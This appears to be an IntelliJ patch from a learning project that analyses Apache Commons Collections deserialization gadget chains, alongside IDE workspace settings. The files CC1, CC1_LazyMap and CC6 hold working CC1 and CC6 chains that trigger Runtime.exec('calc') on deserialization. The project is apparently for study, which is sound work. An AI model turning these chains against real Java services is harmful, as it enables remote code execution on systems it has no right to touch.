@@ -1,0 +1,374 @@
+Index: .idea/misc.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+><?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<project version=\"4\">\r\n  <component name=\"ExternalStorageConfigurationManager\" enabled=\"true\" />\r\n  <component name=\"MavenProjectsManager\">\r\n    <option name=\"originalFiles\">\r\n      <list>\r\n        <option value=\"$PROJECT_DIR$/pom.xml\" />\r\n      </list>\r\n    </option>\r\n  </component>\r\n  <component name=\"ProjectRootManager\" version=\"2\" languageLevel=\"JDK_1_8\" default=\"true\" project-jdk-name=\"1.8.0_60\" project-jdk-type=\"JavaSDK\">\r\n    <output url=\"file://$PROJECT_DIR$/out\" />\r\n  </component>\r\n</project>
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/misc.xml b/.idea/misc.xml
+--- a/.idea/misc.xml	(revision 77ec4eab3d28e3f80de12b56ac5e24019adcb2ab)
++++ b/.idea/misc.xml	(date 1726302239037)
+@@ -8,7 +8,7 @@
+       </list>
+     </option>
+   </component>
+-  <component name="ProjectRootManager" version="2" languageLevel="JDK_1_8" default="true" project-jdk-name="1.8.0_60" project-jdk-type="JavaSDK">
++  <component name="ProjectRootManager" version="2" languageLevel="JDK_1_8" default="true" project-jdk-name="1.8.0_92" project-jdk-type="JavaSDK">
+     <output url="file://$PROJECT_DIR$/out" />
+   </component>
+ </project>
+\ No newline at end of file
+Index: .idea/workspace.xml
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+><?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<project version=\"4\">\r\n  <component name=\"AutoImportSettings\">\r\n    <option name=\"autoReloadType\" value=\"SELECTIVE\" />\r\n  </component>\r\n  <component name=\"ChangeListManager\">\r\n    <list default=\"true\" id=\"5adbc941-5d27-4bfd-ad29-cea9cc6eeef0\" name=\"Changes\" comment=\"第一次提交，分析CC1-transformedMap方式完整过程\" />\r\n    <option name=\"SHOW_DIALOG\" value=\"false\" />\r\n    <option name=\"HIGHLIGHT_CONFLICTS\" value=\"true\" />\r\n    <option name=\"HIGHLIGHT_NON_ACTIVE_CHANGELIST\" value=\"false\" />\r\n    <option name=\"LAST_RESOLUTION\" value=\"IGNORE\" />\r\n  </component>\r\n  <component name=\"Git.Settings\">\r\n    <option name=\"RECENT_GIT_ROOT_PATH\" value=\"$PROJECT_DIR$\" />\r\n  </component>\r\n  <component name=\"MarkdownSettingsMigration\">\r\n    <option name=\"stateVersion\" value=\"1\" />\r\n  </component>\r\n  <component name=\"MavenImportPreferences\">\r\n    <option name=\"importingSettings\">\r\n      <MavenImportingSettings>\r\n        <option name=\"workspaceImportEnabled\" value=\"true\" />\r\n      </MavenImportingSettings>\r\n    </option>\r\n  </component>\r\n  <component name=\"ProjectId\" id=\"2j2Gw66bF4POys6jsQCnzGBAIEs\" />\r\n  <component name=\"ProjectLevelVcsManager\" settingsEditedManually=\"true\" />\r\n  <component name=\"ProjectViewState\">\r\n    <option name=\"showLibraryContents\" value=\"true\" />\r\n  </component>\r\n  <component name=\"PropertiesComponent\"><![CDATA[{\r\n  \"keyToString\": {\r\n    \"RunOnceActivity.OpenProjectViewOnStart\": \"true\",\r\n    \"RunOnceActivity.ShowReadmeOnStart\": \"true\",\r\n    \"SHARE_PROJECT_CONFIGURATION_FILES\": \"true\",\r\n    \"WebServerToolWindowFactoryState\": \"false\",\r\n    \"last_opened_file_path\": \"C:/Program Files/Java/jdk1.8.0_65/src\",\r\n    \"node.js.detected.package.eslint\": \"true\",\r\n    \"node.js.detected.package.tslint\": \"true\",\r\n    \"node.js.selected.package.eslint\": \"(autodetect)\",\r\n    \"node.js.selected.package.tslint\": \"(autodetect)\",\r\n    \"project.structure.last.edited\": \"SDKs\",\r\n    \"project.structure.proportion\": \"0.15\",\r\n    \"project.structure.side.proportion\": \"0.2\",\r\n    \"vue.rearranger.settings.migration\": \"true\"\r\n  }\r\n}]]></component>\r\n  <component name=\"RunManager\">\r\n    <configuration name=\"CC1\" type=\"Application\" factoryName=\"Application\" nameIsGenerated=\"true\">\r\n      <option name=\"ALTERNATIVE_JRE_PATH\" value=\"1.8.0_65\" />\r\n      <option name=\"ALTERNATIVE_JRE_PATH_ENABLED\" value=\"true\" />\r\n      <option name=\"MAIN_CLASS_NAME\" value=\"org.example.CC1\" />\r\n      <module name=\"CCLink_Demo\" />\r\n      <method v=\"2\">\r\n        <option name=\"Make\" enabled=\"true\" />\r\n      </method>\r\n    </configuration>\r\n  </component>\r\n  <component name=\"SpellCheckerSettings\" RuntimeDictionaries=\"0\" Folders=\"0\" CustomDictionaries=\"0\" DefaultDictionary=\"application-level\" UseSingleDictionary=\"true\" transferred=\"true\" />\r\n  <component name=\"TaskManager\">\r\n    <task active=\"true\" id=\"Default\" summary=\"Default task\">\r\n      <changelist id=\"5adbc941-5d27-4bfd-ad29-cea9cc6eeef0\" name=\"Changes\" comment=\"\" />\r\n      <created>1720577994300</created>\r\n      <option name=\"number\" value=\"Default\" />\r\n      <option name=\"presentableId\" value=\"Default\" />\r\n      <updated>1720577994300</updated>\r\n      <workItem from=\"1720577995427\" duration=\"9124000\" />\r\n      <workItem from=\"1720597763800\" duration=\"1821000\" />\r\n      <workItem from=\"1720677432493\" duration=\"15460000\" />\r\n    </task>\r\n    <task id=\"LOCAL-00001\" summary=\"第一次提交，分析CC1-transformedMap方式完整过程\">\r\n      <created>1720704485360</created>\r\n      <option name=\"number\" value=\"00001\" />\r\n      <option name=\"presentableId\" value=\"LOCAL-00001\" />\r\n      <option name=\"project\" value=\"LOCAL\" />\r\n      <updated>1720704485360</updated>\r\n    </task>\r\n    <task id=\"LOCAL-00002\" summary=\"第一次提交，分析CC1-transformedMap方式完整过程\">\r\n      <created>1720704924928</created>\r\n      <option name=\"number\" value=\"00002\" />\r\n      <option name=\"presentableId\" value=\"LOCAL-00002\" />\r\n      <option name=\"project\" value=\"LOCAL\" />\r\n      <updated>1720704924928</updated>\r\n    </task>\r\n    <option name=\"localTasksCounter\" value=\"3\" />\r\n    <servers />\r\n  </component>\r\n  <component name=\"TypeScriptGeneratedFilesManager\">\r\n    <option name=\"version\" value=\"3\" />\r\n  </component>\r\n  <component name=\"Vcs.Log.Tabs.Properties\">\r\n    <option name=\"TAB_STATES\">\r\n      <map>\r\n        <entry key=\"MAIN\">\r\n          <value>\r\n            <State />\r\n          </value>\r\n        </entry>\r\n      </map>\r\n    </option>\r\n  </component>\r\n  <component name=\"VcsManagerConfiguration\">\r\n    <MESSAGE value=\"第一次提交，分析CC1-transformedMap方式完整过程\" />\r\n    <option name=\"LAST_COMMIT_MESSAGE\" value=\"第一次提交，分析CC1-transformedMap方式完整过程\" />\r\n  </component>\r\n  <component name=\"XDebuggerManager\">\r\n    <breakpoint-manager>\r\n      <breakpoints>\r\n        <line-breakpoint enabled=\"true\" type=\"java-line\">\r\n          <url>file://C:/Program Files/Java/jdk1.8.0_65/src/sun/reflect/annotation/AnnotationInvocationHandler.java</url>\r\n          <line>450</line>\r\n          <option name=\"timeStamp\" value=\"9\" />\r\n        </line-breakpoint>\r\n        <line-breakpoint enabled=\"true\" type=\"java-line\">\r\n          <url>file://C:/Program Files/Java/jdk1.8.0_65/src/sun/reflect/annotation/AnnotationInvocationHandler.java</url>\r\n          <line>447</line>\r\n          <option name=\"timeStamp\" value=\"11\" />\r\n        </line-breakpoint>\r\n      </breakpoints>\r\n    </breakpoint-manager>\r\n  </component>\r\n</project>
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/.idea/workspace.xml b/.idea/workspace.xml
+--- a/.idea/workspace.xml	(revision 77ec4eab3d28e3f80de12b56ac5e24019adcb2ab)
++++ b/.idea/workspace.xml	(date 1726322459537)
+@@ -4,11 +4,24 @@
+     <option name="autoReloadType" value="SELECTIVE" />
+   </component>
+   <component name="ChangeListManager">
+-    <list default="true" id="5adbc941-5d27-4bfd-ad29-cea9cc6eeef0" name="Changes" comment="第一次提交，分析CC1-transformedMap方式完整过程" />
++    <list default="true" id="5adbc941-5d27-4bfd-ad29-cea9cc6eeef0" name="Changes" comment="第一次提交，分析CC1-transformedMap方式完整过程">
++      <change afterPath="$PROJECT_DIR$/src/main/java/org/example/CC1_LazyMap.java" afterDir="false" />
++      <change afterPath="$PROJECT_DIR$/src/main/java/org/example/CC6.java" afterDir="false" />
++      <change beforePath="$PROJECT_DIR$/.idea/misc.xml" beforeDir="false" afterPath="$PROJECT_DIR$/.idea/misc.xml" afterDir="false" />
++      <change beforePath="$PROJECT_DIR$/.idea/workspace.xml" beforeDir="false" afterPath="$PROJECT_DIR$/.idea/workspace.xml" afterDir="false" />
++      <change beforePath="$PROJECT_DIR$/src/main/java/org/example/CC1.java" beforeDir="false" afterPath="$PROJECT_DIR$/src/main/java/org/example/CC1.java" afterDir="false" />
++    </list>
+     <option name="SHOW_DIALOG" value="false" />
+     <option name="HIGHLIGHT_CONFLICTS" value="true" />
+     <option name="HIGHLIGHT_NON_ACTIVE_CHANGELIST" value="false" />
+     <option name="LAST_RESOLUTION" value="IGNORE" />
++  </component>
++  <component name="FileTemplateManagerImpl">
++    <option name="RECENT_TEMPLATES">
++      <list>
++        <option value="Class" />
++      </list>
++    </option>
+   </component>
+   <component name="Git.Settings">
+     <option name="RECENT_GIT_ROOT_PATH" value="$PROJECT_DIR$" />
+@@ -34,7 +47,7 @@
+     "RunOnceActivity.ShowReadmeOnStart": "true",
+     "SHARE_PROJECT_CONFIGURATION_FILES": "true",
+     "WebServerToolWindowFactoryState": "false",
+-    "last_opened_file_path": "C:/Program Files/Java/jdk1.8.0_65/src",
++    "last_opened_file_path": "C:/Program Files/Java/jdk1.8.0_92/src",
+     "node.js.detected.package.eslint": "true",
+     "node.js.detected.package.tslint": "true",
+     "node.js.selected.package.eslint": "(autodetect)",
+@@ -42,10 +55,11 @@
+     "project.structure.last.edited": "SDKs",
+     "project.structure.proportion": "0.15",
+     "project.structure.side.proportion": "0.2",
++    "settings.editor.selected.configurable": "Debugger_Data_Views_Java",
+     "vue.rearranger.settings.migration": "true"
+   }
+ }]]></component>
+-  <component name="RunManager">
++  <component name="RunManager" selected="Application.CC6">
+     <configuration name="CC1" type="Application" factoryName="Application" nameIsGenerated="true">
+       <option name="ALTERNATIVE_JRE_PATH" value="1.8.0_65" />
+       <option name="ALTERNATIVE_JRE_PATH_ENABLED" value="true" />
+@@ -55,6 +69,34 @@
+         <option name="Make" enabled="true" />
+       </method>
+     </configuration>
++    <configuration name="CC1_LazyMap" type="Application" factoryName="Application" temporary="true" nameIsGenerated="true">
++      <option name="ALTERNATIVE_JRE_PATH" value="1.8.0_65" />
++      <option name="ALTERNATIVE_JRE_PATH_ENABLED" value="true" />
++      <option name="MAIN_CLASS_NAME" value="org.example.CC1_LazyMap" />
++      <module name="CCLink_Demo" />
++      <method v="2">
++        <option name="Make" enabled="true" />
++      </method>
++    </configuration>
++    <configuration name="CC6" type="Application" factoryName="Application">
++      <option name="ALTERNATIVE_JRE_PATH" value="1.8.0_92" />
++      <option name="ALTERNATIVE_JRE_PATH_ENABLED" value="true" />
++      <option name="MAIN_CLASS_NAME" value="org.example.CC6" />
++      <module name="CCLink_Demo" />
++      <method v="2">
++        <option name="Make" enabled="true" />
++      </method>
++    </configuration>
++    <list>
++      <item itemvalue="Application.CC6" />
++      <item itemvalue="Application.CC1" />
++      <item itemvalue="Application.CC1_LazyMap" />
++    </list>
++    <recent_temporary>
++      <list>
++        <item itemvalue="Application.CC1_LazyMap" />
++      </list>
++    </recent_temporary>
+   </component>
+   <component name="SpellCheckerSettings" RuntimeDictionaries="0" Folders="0" CustomDictionaries="0" DefaultDictionary="application-level" UseSingleDictionary="true" transferred="true" />
+   <component name="TaskManager">
+@@ -66,7 +108,22 @@
+       <updated>1720577994300</updated>
+       <workItem from="1720577995427" duration="9124000" />
+       <workItem from="1720597763800" duration="1821000" />
+-      <workItem from="1720677432493" duration="15460000" />
++      <workItem from="1720677432493" duration="15764000" />
++      <workItem from="1720744784418" duration="624000" />
++      <workItem from="1720762674473" duration="2672000" />
++      <workItem from="1721090700505" duration="48000" />
++      <workItem from="1721092260442" duration="104000" />
++      <workItem from="1721103621558" duration="862000" />
++      <workItem from="1721116927286" duration="159000" />
++      <workItem from="1721117648028" duration="627000" />
++      <workItem from="1721178287763" duration="22000" />
++      <workItem from="1721228293432" duration="1184000" />
++      <workItem from="1721272016730" duration="2110000" />
++      <workItem from="1721290230789" duration="214000" />
++      <workItem from="1721478668576" duration="5000" />
++      <workItem from="1726210180314" duration="12731000" />
++      <workItem from="1726300247452" duration="666000" />
++      <workItem from="1726300927135" duration="14380000" />
+     </task>
+     <task id="LOCAL-00001" summary="第一次提交，分析CC1-transformedMap方式完整过程">
+       <created>1720704485360</created>
+@@ -82,7 +139,14 @@
+       <option name="project" value="LOCAL" />
+       <updated>1720704924928</updated>
+     </task>
+-    <option name="localTasksCounter" value="3" />
++    <task id="LOCAL-00003" summary="第一次提交，分析CC1-transformedMap方式完整过程">
++      <created>1720705237482</created>
++      <option name="number" value="00003" />
++      <option name="presentableId" value="LOCAL-00003" />
++      <option name="project" value="LOCAL" />
++      <updated>1720705237483</updated>
++    </task>
++    <option name="localTasksCounter" value="4" />
+     <servers />
+   </component>
+   <component name="TypeScriptGeneratedFilesManager">
+@@ -107,16 +171,39 @@
+     <breakpoint-manager>
+       <breakpoints>
+         <line-breakpoint enabled="true" type="java-line">
+-          <url>file://C:/Program Files/Java/jdk1.8.0_65/src/sun/reflect/annotation/AnnotationInvocationHandler.java</url>
+-          <line>450</line>
+-          <option name="timeStamp" value="9" />
++          <url>jar://$PROJECT_DIR$/../../path/to/local/repo/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar!/org/apache/commons/collections/map/TransformedMap.java</url>
++          <line>203</line>
++          <option name="timeStamp" value="15" />
++        </line-breakpoint>
++        <line-breakpoint enabled="true" type="java-line">
++          <url>jar://C:/Program Files/Java/jdk1.8.0_65/jre/lib/rt.jar!/sun/reflect/annotation/AnnotationInvocationHandler.class</url>
++          <line>58</line>
++          <option name="timeStamp" value="20" />
++        </line-breakpoint>
++        <line-breakpoint enabled="true" type="java-line">
++          <url>file://$PROJECT_DIR$/src/main/java/org/example/CC6.java</url>
++          <line>52</line>
++          <option name="timeStamp" value="56" />
++        </line-breakpoint>
++        <line-breakpoint enabled="true" type="java-line">
++          <url>jar://$PROJECT_DIR$/../../path/to/local/repo/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar!/org/apache/commons/collections/functors/InvokerTransformer.java</url>
++          <line>125</line>
++          <option name="timeStamp" value="57" />
+         </line-breakpoint>
+         <line-breakpoint enabled="true" type="java-line">
+-          <url>file://C:/Program Files/Java/jdk1.8.0_65/src/sun/reflect/annotation/AnnotationInvocationHandler.java</url>
+-          <line>447</line>
+-          <option name="timeStamp" value="11" />
++          <url>jar://$PROJECT_DIR$/../../path/to/local/repo/commons-collections/commons-collections/3.2.1/commons-collections-3.2.1-sources.jar!/org/apache/commons/collections/map/LazyMap.java</url>
++          <line>157</line>
++          <option name="timeStamp" value="59" />
+         </line-breakpoint>
+       </breakpoints>
+     </breakpoint-manager>
++    <pin-to-top-manager>
++      <pinned-members>
++        <PinnedItemInfo parentTag="java.util.HashMap" memberName="entrySet" />
++      </pinned-members>
++    </pin-to-top-manager>
++  </component>
++  <component name="com.intellij.coverage.CoverageDataManagerImpl">
++    <SUITE FILE_PATH="coverage/CCLink_Demo$CC6.ic" NAME="CC6 Coverage Results" MODIFIED="1726319451852" SOURCE_PROVIDER="com.intellij.coverage.DefaultCoverageFileProvider" RUNNER="idea" COVERAGE_BY_TEST_ENABLED="false" COVERAGE_TRACING_ENABLED="false" />
+   </component>
+ </project>
+\ No newline at end of file
+Index: src/main/java/org/example/CC1_LazyMap.java
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/src/main/java/org/example/CC1_LazyMap.java b/src/main/java/org/example/CC1_LazyMap.java
+new file mode 100644
+--- /dev/null	(date 1726300913858)
++++ b/src/main/java/org/example/CC1_LazyMap.java	(date 1726300913858)
+@@ -0,0 +1,58 @@
++package org.example;
++
++import org.apache.commons.collections.Transformer;
++import org.apache.commons.collections.functors.ChainedTransformer;
++import org.apache.commons.collections.functors.ConstantTransformer;
++import org.apache.commons.collections.functors.InvokerTransformer;
++import org.apache.commons.collections.map.LazyMap;
++
++import java.io.ByteArrayInputStream;
++import java.io.ByteArrayOutputStream;
++import java.io.ObjectInputStream;
++import java.io.ObjectOutputStream;
++import java.lang.annotation.Target;
++import java.lang.reflect.Constructor;
++import java.lang.reflect.InvocationHandler;
++import java.lang.reflect.Proxy;
++import java.util.HashMap;
++import java.util.Map;
++
++public class CC1_LazyMap {
++    public static void main(String[] args) throws Exception {
++        // 第一层
++        Transformer[] tfs = new Transformer[]{
++                new ConstantTransformer(Runtime.class),
++                new InvokerTransformer("getMethod",
++                        new Class[]{String.class, Class[].class},
++                        new Object[]{"getRuntime", null}),
++                new InvokerTransformer("invoke",
++                        new Class[]{Object.class, Object[].class},
++                        new Object[]{null, null}),
++                new InvokerTransformer("exec",
++                        new Class[]{String.class},
++                        new Object[]{"calc"}),
++                new ConstantTransformer(1)
++        };
++        Transformer transformerChain = new ChainedTransformer(tfs);
++        Map<Object, Object> map = new HashMap<>();
++        map.put("value", "3xsh0re");
++        Map<Object,Object> lazyMap = LazyMap.decorate(map,transformerChain);
++//        获取类
++        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
++        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
++        constructor.setAccessible(true);
++//        对Map创建代理,使用AnnotationInvocationHandler进行代理
++        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,lazyMap);
++        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
++//        对proxyMap进行再封装,因为我们需要的是AnnotationInvocationHandler的readObject
++        handler = (InvocationHandler) constructor.newInstance(Target.class,proxyMap);
++
++//        测试
++        ByteArrayOutputStream barr = new ByteArrayOutputStream();
++        ObjectOutputStream oos = new ObjectOutputStream(barr);
++        oos.writeObject(handler);
++        oos.close();
++        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
++        Object o = (Object)ois.readObject();
++    }
++}
+Index: src/main/java/org/example/CC6.java
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/src/main/java/org/example/CC6.java b/src/main/java/org/example/CC6.java
+new file mode 100644
+--- /dev/null	(date 1726322459519)
++++ b/src/main/java/org/example/CC6.java	(date 1726322459519)
+@@ -0,0 +1,55 @@
++package org.example;
++
++import org.apache.commons.collections.Transformer;
++import org.apache.commons.collections.functors.ChainedTransformer;
++import org.apache.commons.collections.functors.ConstantTransformer;
++import org.apache.commons.collections.functors.InvokerTransformer;
++import org.apache.commons.collections.keyvalue.TiedMapEntry;
++import org.apache.commons.collections.map.LazyMap;
++
++import java.io.*;
++import java.lang.reflect.Field;
++import java.util.Collection;
++import java.util.HashMap;
++import java.util.HashSet;
++import java.util.Map;
++
++public class CC6 {
++    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
++        Transformer[] fakeFormer = new Transformer[]{new ConstantTransformer(1)};
++        // 第一层
++        Transformer[] tfs = new Transformer[]{
++                new ConstantTransformer(Runtime.class),
++                new InvokerTransformer("getMethod",
++                        new Class[]{String.class, Class[].class},
++                        new Object[]{"getRuntime", null}),
++                new InvokerTransformer("invoke",
++                        new Class[]{Object.class, Object[].class},
++                        new Object[]{null, null}),
++                new InvokerTransformer("exec",
++                        new Class[]{String.class},
++                        new Object[]{"calc"}),
++                new ConstantTransformer(1)
++        };
++        Transformer transformerChain = new ChainedTransformer(fakeFormer);
++        Map lazyMap = LazyMap.decorate(new HashMap<>(),transformerChain);
++        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"key");
++        Map tiedMap = new HashMap<>();
++        tiedMap.put(tiedMapEntry,"Exp");
++        HashSet hashSet = new HashSet(1);
++        hashSet.add(tiedMap);
++        lazyMap.remove("key");
++//        反射修改变量
++        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
++        f.setAccessible(true);
++        f.set(transformerChain, tfs);
++
++        // 测试
++        ByteArrayOutputStream barr = new ByteArrayOutputStream();
++        ObjectOutputStream oos = new ObjectOutputStream(barr);
++        oos.writeObject(hashSet);
++        oos.close();
++        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
++        ois.readObject();
++    }
++}
+Index: src/main/java/org/example/CC1.java
+IDEA additional info:
+Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
+<+>package org.example;\r\n\r\nimport org.apache.commons.collections.Transformer;\r\nimport org.apache.commons.collections.functors.ChainedTransformer;\r\nimport org.apache.commons.collections.functors.ConstantTransformer;\r\nimport org.apache.commons.collections.functors.InvokerTransformer;\r\nimport org.apache.commons.collections.map.TransformedMap;\r\n\r\nimport java.io.FileInputStream;\r\nimport java.io.FileOutputStream;\r\nimport java.io.ObjectInputStream;\r\nimport java.io.ObjectOutputStream;\r\nimport java.lang.annotation.Target;\r\nimport java.lang.reflect.Constructor;\r\nimport java.util.HashMap;\r\nimport java.util.Map;\r\n\r\npublic class CC1 {\r\n    public void testChain(String[] args) {\r\n        // 初步实验\r\n        new InvokerTransformer(\"exec\",\r\n                new Class[]{String.class},\r\n                new Object[]{\"calc\"}).transform(Runtime.getRuntime());\r\n        // 获取一个runtime实例\r\n        Runtime shell = Runtime.getRuntime();\r\n        // 第一层\r\n        InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});\r\n        // 第二层\r\n        Map<Object,Object> map=new HashMap<>();\r\n        map.put(\"Hacking\",\"3xsh0re\");\r\n\r\n        //TransformedMap.decorate方法调用TransformedMap的构造方法\r\n        //构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。\r\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);\r\n\r\n        //AbstractInputCheckedMapDecorator类中的MapEntry类的setValue()方法（作用是遍历map）\r\n        //调用了 TransformedMap类中的checkSetValue()方法\r\n        for(Map.Entry entry:transformedMap.entrySet()){\r\n            entry.setValue(shell);\r\n        }\r\n    }\r\n    public static void debugChain(String[] args) throws Exception{\r\n        // 获取一个runtime实例\r\n        Runtime shell = Runtime.getRuntime();\r\n        // 第一层\r\n        InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\",\r\n                new Class[]{String.class},\r\n                new Object[]{\"calc\"});\r\n        // 第二层\r\n        Map map=new HashMap();\r\n        map.put(\"Hacking\",\"3xsh0re\");\r\n\r\n        //TransformedMap.decorate方法调用TransformedMap的构造方法\r\n        //构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。\r\n        Map transformedMap = TransformedMap.decorate(map, null, invokerTransformer);\r\n\r\n        // 通过反射获取AnnotationInvocationHandler的实例\r\n        Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\r\n        Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class);\r\n        annotationConstructor.setAccessible(true);\r\n        Object obj = annotationConstructor.newInstance(Override.class, transformedMap);\r\n        serialize(obj);\r\n        unserialize(\"./exec.bin\");\r\n\r\n    }\r\n    public static void main(String[] args) throws Exception{\r\n        // 第一层\r\n        Transformer[] transformers = new Transformer[]{\r\n                new ConstantTransformer(Runtime.class),\r\n                new InvokerTransformer(\"getMethod\",\r\n                        new Class[]{String.class, Class[].class},\r\n                        new Object[]{\"getRuntime\", null}),\r\n                new InvokerTransformer(\"invoke\",\r\n                        new Class[]{Object.class, Object[].class},\r\n                        new Object[]{null, null}),\r\n                new InvokerTransformer(\"exec\",\r\n                        new Class[]{String.class},\r\n                        new Object[]{\"calc\"})\r\n        };\r\n        Transformer transformerChain = new ChainedTransformer(transformers);\r\n        // 第二层\r\n        Map<Object, Object> map = new HashMap<>();\r\n        map.put(\"value\", \"3xsh0re\");\r\n\r\n        //TransformedMap.decorate方法调用TransformedMap的构造方法\r\n        //构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。\r\n        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, transformerChain);\r\n\r\n        // 通过反射获取AnnotationInvocationHandler的实例\r\n        Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\r\n        Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class);\r\n        annotationConstructor.setAccessible(true);\r\n        Object obj = annotationConstructor.newInstance(Target.class, transformedMap);\r\n        serialize(obj);\r\n        unserialize(\"./exec.bin\");\r\n    }\r\n\r\n\r\n    //序列化方法\r\n    public static void serialize(Object object) throws Exception {\r\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"./exec.bin\"));\r\n        oos.writeObject(object);\r\n    }\r\n\r\n    //反序列化方法\r\n    public static void unserialize(String filename) throws Exception {\r\n        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));\r\n        objectInputStream.readObject();\r\n    }\r\n}
+Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
+<+>UTF-8
+===================================================================
+diff --git a/src/main/java/org/example/CC1.java b/src/main/java/org/example/CC1.java
+--- a/src/main/java/org/example/CC1.java	(revision 77ec4eab3d28e3f80de12b56ac5e24019adcb2ab)
++++ b/src/main/java/org/example/CC1.java	(date 1721284373115)
+@@ -51,7 +51,7 @@
+         map.put("Hacking","3xsh0re");
+ 
+         //TransformedMap.decorate方法调用TransformedMap的构造方法
+-        //构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。
++        //构造方法把invoker实例赋值给TransformedMap.valueTransformer属性
+         Map transformedMap = TransformedMap.decorate(map, null, invokerTransformer);
+ 
+         // 通过反射获取AnnotationInvocationHandler的实例
+@@ -84,13 +84,17 @@
+ 
+         //TransformedMap.decorate方法调用TransformedMap的构造方法
+         //构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。
+-        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, transformerChain);
++        Map<Object, Object> transformedMap =
++                TransformedMap.decorate(map, null, transformerChain);
+ 
+         // 通过反射获取AnnotationInvocationHandler的实例
+-        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+-        Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
++        Class c = Class.forName(
++                "sun.reflect.annotation.AnnotationInvocationHandler");
++        Constructor annotationConstructor =
++                c.getDeclaredConstructor(Class.class, Map.class);
+         annotationConstructor.setAccessible(true);
+-        Object obj = annotationConstructor.newInstance(Target.class, transformedMap);
++        Object obj = annotationConstructor.
++                newInstance(Target.class, transformedMap);
+         serialize(obj);
+         unserialize("./exec.bin");
+     }
